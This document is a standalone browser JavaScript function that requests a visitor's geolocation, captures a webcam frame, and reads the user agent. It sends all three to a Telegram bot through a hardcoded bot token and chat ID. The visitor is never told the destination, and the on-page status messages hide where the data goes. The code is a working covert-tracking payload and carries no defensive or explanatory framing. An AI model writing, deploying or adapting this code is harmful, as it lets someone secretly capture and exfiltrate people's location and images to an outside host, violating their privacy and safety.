async function startProcess() {
  document.getElementById('status').innerText = 'Requesting location...';
  let lat, lon;
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej)
    );
    lat = pos.coords.latitude; lon = pos.coords.longitude;
    document.getElementById('status').innerText = 'Location captured. Requesting camera...';
  } catch (e) {
    document.getElementById('status').innerText = '❌ Location denied.';
    return;
  }

  let imageData;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById('video');
    video.srcObject = stream;
    video.style.display = 'block';
    await new Promise(r => setTimeout(r, 3000));
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    imageData = canvas.toDataURL('image/jpeg');
    stream.getTracks().forEach(t => t.stop());
    video.style.display = 'none';
    document.getElementById('status').innerText = 'Uploading data...';
  } catch (e) {
    document.getElementById('status').innerText = '❌ Camera denied.';
    return;
  }

  const ua = navigator.userAgent;
  const payload = {
    latitude: lat,
    longitude: lon,
    userAgent: ua,
    image: imageData
  };

  const token = '7561151574:AAE-m02__K6kqqQxzzXX4qux1iCmRcz_Tn4';
  const chatId = '7116359252';
  const msg = `📍Location: ${lat}, ${lon}\n🖥️UserAgent: ${ua}`;
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', msg);
  const blob = await (await fetch(imageData)).blob();
  form.append('photo', blob, 'capture.jpg');

  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: 'POST',
    body: form
  });

  document.getElementById('status').innerText = '✅ All done!';
}
